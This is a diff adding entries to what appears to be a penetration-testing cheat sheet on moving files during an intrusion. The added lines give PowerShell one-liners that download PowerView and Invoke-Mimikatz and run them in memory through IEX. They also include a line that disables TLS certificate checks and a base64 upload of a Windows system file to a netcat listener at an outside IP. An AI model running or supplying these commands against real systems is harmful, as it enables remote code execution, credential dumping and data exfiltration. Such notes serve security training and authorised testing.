@@ -380,9 +380,27 @@ python3 ssh-audit.py IP
 . scp(needsshpassword) :
 . scp filename username@targetip:filedirectory
 . Base64 : 
-. base64 filename -w 0
-. echo filecontent | base64 -d > filename
-. check legitimacy of file transfer = md5sum filename
+a) base64 filename -w 0
+b) echo filecontent | base64 -d > filename
+c) check legitimacy of file transfer = md5sum filename
+1. Powershell
+. download file: 
+a) (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+EX: (New-Object Net.WebClient).DownloadFile('[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:%5C%5CUsers%5C%5CPublic%5C%5CDownloads%5C%5CPowerView.ps1)')
+. alternative download file: 
+a) (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+EX: (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+. download fileless method:
+a) (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+. alternative download fileless method = Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+. bypass ssl/tls download fileless method:
+a) IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+b) [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+. base64 Web Upload:
+a) $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+b) Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+c) nc -lvnp 8000
+d) echo <base64> | base64 -d -w 0 > hosts
 
 
 
